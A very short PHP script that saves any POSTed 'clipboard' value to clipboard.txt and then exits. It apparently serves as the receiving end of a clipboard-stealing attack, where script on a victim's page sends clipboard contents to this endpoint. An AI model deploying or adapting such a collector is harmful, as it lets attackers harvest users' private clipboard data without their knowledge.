<?php
if (isset($_POST["clipboard"])){
    $file = fopen("clipboard.txt", "w");
    fwrite($file, "ClipBoard Content: ".$_POST["clipboard"]);
    fclose($file);
}
exit();
?>